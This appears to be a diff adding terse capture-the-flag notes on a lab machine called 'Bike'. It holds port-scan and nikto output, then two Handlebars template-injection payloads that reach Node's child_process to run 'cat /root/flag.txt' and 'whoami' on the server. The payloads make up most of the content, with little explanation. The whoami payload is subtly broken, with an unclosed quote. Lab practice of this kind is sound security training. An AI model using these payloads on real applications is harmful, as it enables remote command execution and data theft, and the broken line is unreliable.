@@ -1,0 +1,84 @@
+Bike IP:10.129.194.103
+
+rustscan:
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+
+nmap:
+
+PORT   STATE    SERVICE REASON      VERSION
+22/tcp filtered ssh     no-response
+80/tcp filtered http    no-response
+
+
+nikto:
+
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.129.194.103
++ Target Hostname:    10.129.194.103
++ Target Port:        80
++ Start Time:         2023-04-27 11:28:38 (GMT3)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ /: Retrieved x-powered-by header: Express.
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST .
++ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Transport endpoint is not connected
++ Scan terminated: 18 error(s) and 4 item(s) reported on remote host
++ End Time:           2023-04-27 11:32:03 (GMT3) (205 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+STTI found in email field:
+
+
+read root flag:(encode this in URL)
+
+={{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+
+get user :
+
+={{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return process.mainModule.require('child_process').execSync('whoami);"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
